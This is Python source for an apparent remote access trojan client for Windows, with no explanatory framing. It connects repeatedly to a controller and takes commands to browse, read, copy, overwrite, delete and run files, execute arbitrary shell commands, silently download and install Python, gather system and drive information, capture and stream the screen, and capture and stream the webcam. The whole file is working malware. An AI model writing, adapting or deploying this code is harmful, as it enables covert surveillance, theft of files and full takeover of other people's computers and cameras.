import socket
import os
from uuid import uuid4
import subprocess
import platform
import pyautogui
import sys
import cv2

ADDR = socket.gethostbyname(socket.gethostname())
PORT = 80

os.chdir(os.getenv('USERPROFILE'))

def recvall(connection):

    sizeOfMsg = int(connection.recv(64).decode())

    msg = b''

    while len(msg) != sizeOfMsg:
        msg += connection.recv(sizeOfMsg - len(msg))

    return msg.decode()

def getSendableMsg(msg):

    sizeOfMsg = str(len(msg))

    sizeOfMsg = '0'*(64-len(sizeOfMsg)) + sizeOfMsg

    return (sizeOfMsg + str(msg)).encode()

while True:

    try:

        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:

            while True:

                try:
                    s.connect((ADDR, PORT))
                    break
                except:
                    pass

            while True:

                command = recvall(s)

                if command == 'Refresh':
                    s.send(getSendableMsg('online'))

                elif command == 'EstablishConnection':
                    s.send(getSendableMsg(os.getcwd()))
                
                elif command == 'ls':
                    try:
                        listedFiles = os.listdir()
                    except:
                        listedFiles = 'ERROR'
                    s.send(getSendableMsg(str(listedFiles)))
                
                elif command == 'cd':
                    changedDirectory = recvall(s)
                    if os.path.exists(changedDirectory) and os.path.isdir(changedDirectory):
                        os.chdir(changedDirectory)
                        s.send(getSendableMsg(os.getcwd()))
                    else:
                        s.send(getSendableMsg('ERROR'))
                
                elif command == 'goto':
                    gotoDirectory = recvall(s)

                    if os.path.exists(gotoDirectory) and os.path.isdir(gotoDirectory):
                        os.chdir(gotoDirectory)
                        s.send(getSendableMsg(os.getcwd()))
                    else:
                        s.send(getSendableMsg('ERROR'))
                
                elif command == 'size':
                    fileName = recvall(s)
                    try:
                        fileSize = os.stat(fileName).st_size
                    except:
                        fileSize = False
                    if fileSize:
                        s.send(getSendableMsg(f'{fileSize:,}'))
                    else:
                        s.send(getSendableMsg('ERROR'))
                
                elif command == 'read':
                    fileName = recvall(s)
                    try:
                        with open(fileName, 'r') as f:
                            s.send(getSendableMsg(f.read()))
                    except:
                        try:
                            with open(fileName, 'rb') as f:
                                s.send(getSendableMsg(str(f.read())[2:-1]))
                        except:
                            s.send(getSendableMsg('ERROR'))
                
                elif command == 'write':
                    fileName = recvall(s)
                    fileData = recvall(s)
                    if fileData == 'ERROR':
                        pass
                    else:
                        try:
                            if type(eval(fileData)) == bytes:
                                with open(fileName, 'wb') as f:
                                    f.write(eval(fileData))
                            else:
                                with open(fileName, 'w') as f:
                                    f.write(fileData)

                            s.send(getSendableMsg(os.path.join(os.getcwd(), fileName)))

                        except:
                            try:
                                with open(fileName, 'w') as f:
                                    f.write(fileData)
                                
                                s.send(getSendableMsg(os.path.join(os.getcwd(), fileName)))
                            except:
                            
                                s.send(getSendableMsg('ERROR'))
                
                elif command == 'copy':
                    fileName = recvall(s)

                    if os.path.exists(fileName):
                        try:
                            with open(fileName, 'r') as f:
                                fileData = f.read()

                            s.send(getSendableMsg(fileData))
                        except:
                            try:
                                with open(fileName, 'rb') as f:
                                    fileData = f.read()
                                
                                s.send(getSendableMsg(str(fileData)))
                            except:
                                s.send(getSendableMsg('ERROR'))
                    else:
                        s.send(getSendableMsg('ERROR'))
                
                elif command == 'run':
                    fileName = recvall(s)
                    try:
                        os.startfile(fileName)
                        s.send(getSendableMsg('Sucess'))
                    except:
                        s.send(getSendableMsg('ERROR'))
                
                elif command == 'rm':
                    fileName = recvall(s)
                    try:
                        os.remove(fileName)
                        s.send(getSendableMsg('Success'))
                    except:
                        s.send(getSendableMsg('ERROR'))
                
                elif command == 'mkdir':
                    folderName = recvall(s)
                    try:
                        os.mkdir(folderName)
                        s.send(getSendableMsg('Success'))
                    except:
                        s.send(getSendableMsg('ERROR'))

                
                elif command == 'rmdir':
                    folderName = recvall(s)
                    try:
                        os.rmdir(folderName)
                        s.send(getSendableMsg('Success'))
                    except:
                        s.send(getSendableMsg('ERROR'))

                elif command == 'exec':
                    executeCommand = recvall(s)
                    try:
                        commandResult = subprocess.check_output(executeCommand, shell = True)
                        s.send(getSendableMsg(commandResult.decode()))
                    except:
                        s.send(getSendableMsg('ERROR'))

                elif command == 'pyinstall':
                    try:
                        downloadPythonInstaller = subprocess.check_output('curl https://www.python.org/ftp/python/3.11.1/python-3.11.1-amd64.exe --output python-installer.exe', shell = True)
                        runPythonInstaller = subprocess.check_output('python-installer.exe /quiet InstallAllUsers=0 PrependPath=1')
                        os.remove('python-installer.exe')
                        s.send(getSendableMsg('SUCCESS'))
                    except:
                        s.send(getSendableMsg('ERROR'))
                        try:
                            os.remove('python-installer.exe')
                        except:
                            pass

                elif command == 'sysinfo':
                    try:
                        sysInfo = subprocess.check_output('systeminfo', shell = True)
                        s.send(getSendableMsg(sysInfo.decode()))
                    except:
                        s.send(getSendableMsg('ERROR'))
                
                elif command == 'drives':
                    try:
                        sysInfo = subprocess.check_output('fsutil fsinfo drives', shell = True)
                        s.send(getSendableMsg(sysInfo.decode()))
                    except:
                        s.send(getSendableMsg('ERROR'))

                elif command == 'system':
                    try:
                        system = platform.system()
                        s.send(getSendableMsg(system))
                    except:
                        s.send(getSendableMsg('ERROR'))

                elif command == 'screenshot':
                    try:

                        screenshot = pyautogui.screenshot()

                        picSize = (pyautogui.size().width, pyautogui.size().height)

                        s.send(getSendableMsg(str(picSize)))

                        screenshotBytes = screenshot.tobytes()

                        s.send(getSendableMsg(str(sys.getsizeof(screenshotBytes))))

                        s.send(screenshotBytes)

                    except:
                        s.send(getSendableMsg('ERROR'))

                elif command == 'screenshare':

                    while True:
                        try:
                            screenshot = pyautogui.screenshot()

                            picSize = (pyautogui.size().width, pyautogui.size().height)

                            s.send(getSendableMsg(str(picSize)))

                            screenshotBytes = screenshot.tobytes()

                            s.send(getSendableMsg(str(sys.getsizeof(screenshotBytes))))

                            s.send(screenshotBytes)

                            result = recvall(s)

                            if result == 'STOP STREAM':
                                break
                        except:
                            s.send(getSendableMsg('ERROR'))
                            break

                elif command == 'camshot':
                    try:
                        CAMERA = cv2.VideoCapture(0)
                    except:
                        CAMERA = False
                    if CAMERA:
                        result, picture = CAMERA.read()

                        CAMERA.release()

                        picSize = (picture.shape[1], picture.shape[0])

                        s.send(getSendableMsg(str(picSize)))

                        pictureBytes = picture.tobytes()

                        s.send(getSendableMsg(str(sys.getsizeof(pictureBytes))))

                        s.send(pictureBytes)

                    else:
                        s.send(getSendableMsg('ERROR'))
                
                elif command == 'camshare':

                    try:
                        CAMERA = cv2.VideoCapture(0)
                    except:
                        CAMERA = False

                    while True:
                        if CAMERA:
                            result, picture = CAMERA.read()

                            picSize = (picture.shape[1], picture.shape[0])

                            s.send(getSendableMsg(str(picSize)))

                            pictureBytes = picture.tobytes()

                            s.send(getSendableMsg(str(sys.getsizeof(pictureBytes))))

                            s.send(pictureBytes)

                            result = recvall(s)

                            if result == 'STOP STREAM':
                                break
                        else:
                            s.send(getSendableMsg('ERROR'))
                            break

                    try:
                        CAMERA.release()
                    except:
                        pass

                elif command == 'CloseConnection':
                    os.chdir(os.getenv('USERPROFILE'))

                else:
                    os.chdir(os.getenv('USERPROFILE'))
                    break

    except:
        os.chdir(os.getenv('USERPROFILE'))